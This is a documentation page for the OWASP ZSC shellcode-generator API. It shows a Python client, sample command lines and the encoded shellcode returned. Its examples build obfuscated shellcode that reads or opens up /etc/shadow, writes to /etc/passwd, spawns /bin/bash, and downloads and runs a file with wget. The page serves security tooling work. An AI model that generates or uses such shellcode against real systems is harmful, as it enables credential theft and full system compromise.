---
layout: page
title: "API"
date: 2015-09-26 13:36
comments: true
sharing: true
footer: true
---
OWASP ZSC is available now in <a href="http://api.z3r0d4y.com">api.z3r0d4y.com</a>.<br/>
It's very simple to communicate with OWASP ZSC API. You have to using POST method and fill the values.<br/> 
Code Example:
```python
#http://zsc.z3r0d4y.com/api
import httplib, urllib
params = urllib.urlencode({
						'api_name': 'zsc',#it's API name, if you want use OWASP ZSC, You must fill it with 'zsc' 
						'os': 'linux_x86',# os name here
						'job': 'system(\'cat[space]/etc/shadow\')',
						'encode': 'add_random'}) #encoding type
						#function to use [ support: All except "script_executor()" ]
						#to see available features visit: http://zsc.z3r0d4y.com/table.html
						#inputs: same argv in terminal http://zsc.z3r0d4y.com/wiki/
						#>zsc -os linux_x86 -encode none -job "system('ls')" -o file.txt
						#>zsc -os linux_x86 -encode xor_random -job "system('ls[space]-la')" -o file.txt
						#>zsc -os linux_x86 -encode xor_0x41414141 -job "system('ls[space]-la[space]/etc/shadow;chmod[space]777[space]/etc/shadow;ls[space]-la[space]/etc/shadow;cat[space]/etc/shadow;wget[space]file[space];chmod[space]777[space]file;./file')" -o file.txt
						#>zsc -os linux_x86 -encode add_random -job "system('wget[space]file;sh[space]file')" -o file.txt
						#>zsc -os linux_x86 -encode mix_all -job "chmod('/etc/shadow','777')" -o file.txt
						#>zsc -os linux_x86 -encode inc -job "write('/etc/passwd','user:pass')" -o file.txt
						#>zsc -os linux_x86 -encode dec_11 -job "exec('/bin/bash')" -o file.txt
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0'}
conn = httplib.HTTPConnection('api.z3r0d4y.com')
conn.request("POST", "", params, headers)
response = conn.getresponse()
shellcode = response.read().replace('\n','')
print shellcode
```
output:
```python
C:\Users\Ali\Desktop>zsc-api.py
\x31\xd2\x52\x68\x45\x32\x76\x78\x5b\x68\xb5\xcd\x06\x01\x58\xf7\xd8\x01\xd8\x50\x59\xc1\xe9\x08\x51\x68\x6e\x36\x6a\x65\x5b\x68\x3f\xc3\x01\x04\x58\xf7\xd8\x01\xd8\x50\x68\x66\x36\x58\x78\x5b\x68\x37\xd1\xe3\x14\x58\xf7\xd8\x01\xd8\x50\x68\x61\x75\x49\x31\x5b\x68\xfe\x13\xd5\x10\x58\xf7\xd8\x01\xd8\x50\x89\xe6\x52\x68\x75\x47\x77\x6e\x5b\x68\xe5\xb6\x49\x0b\x58\xf7\xd8\x01\xd8\x50\x59\xc1\xe9\x10\x51\x89\xe1\x52\x6a\x68\x68\x56\x33\x72\x78\x5b\x68\x27\xd1\x10\x05\x58\xf7\xd8\x01\xd8\x50\x68\x4c\x56\x71\x73\x5b\x68\x1d\xf4\x07\x05\x58\xf7\xd8\x01\xd8\x50\x89\xe3\x52\x57\x56\x51\x53\x89\xe1\x6a\x09\x58\x83\xc0\x02\x99\xcd\x80

C:\Users\Ali\Desktop>
```
Anyone can use this API on softwares or any OS which not supported to generate shellcodes.

Thank you.

<a href="mailto:Ali[dot]Razmjoo[at]Owasp[dot]Org">Ali Razmjoo</a>
